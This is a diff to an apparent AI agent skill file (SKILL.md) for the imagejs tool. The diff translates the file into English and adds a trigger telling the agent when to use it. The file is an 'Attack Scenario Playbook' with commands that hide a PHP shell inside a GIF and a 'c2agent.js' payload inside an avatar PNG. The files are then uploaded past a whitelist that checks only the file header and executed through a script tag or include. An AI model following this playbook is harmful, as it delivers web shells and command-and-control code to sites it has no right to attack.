@@ -2,37 +2,41 @@
 name: imagejs-polyglot
 description: "imagejs bypasses image upload whitelists. Signals: payload development, weaponization, PHP hidden in GIF, list supported formats."
 zh-signals: "imagejs: 绕过图片上传白名单。信号:载荷开发,武器化,PHP 藏进 GIF,列出支持格式。"
+when-to-use: >-
+  Use when bypassing image upload whitelists with polyglot files; hide
+  JavaScript or PHP payloads inside PNG or GIF images so only the file header
+  is validated.
 ---
 
 # imagejs
 
-- 攻击大类:C07 载荷与文件投递
-- 上游仓库:https://github.com/jklmnn/imagejs
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload and File Delivery
+- Upstream Repository: https://github.com/jklmnn/imagejs
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/jklmnn/imagejs && cd imagejs && make
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./imagejs -i payload.js -o exploit.png js` | JS 藏进 PNG polyglot |
-| `./imagejs -i shell.php -o pic.gif php` | PHP 藏进 GIF |
-| `-l` | 列出支持格式 |
+| `./imagejs -i payload.js -o exploit.png js` | Hide JS in a PNG polyglot |
+| `./imagejs -i shell.php -o pic.gif php` | Hide PHP in a GIF |
+| `-l` | List supported formats |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 绕过图片上传白名单
+### Bypassing image upload whitelists
 
 ```bash
 ./imagejs -i c2agent.js -o avatar.png js
-# 上传头像 .png,配合 <script src=avatar.png> 或 include 执行
+# Upload it as an avatar .png and execute it via <script src=avatar.png> or an include
 ```
 
-## 注意事项
+## Notes
 
-构造图片+脚本 polyglot 文件,绕过仅校验文件头的上传过滤,投递 JS/PHP 载荷。
+Builds image + script polyglot files that bypass upload filters that only validate the file header, delivering JS/PHP payloads.
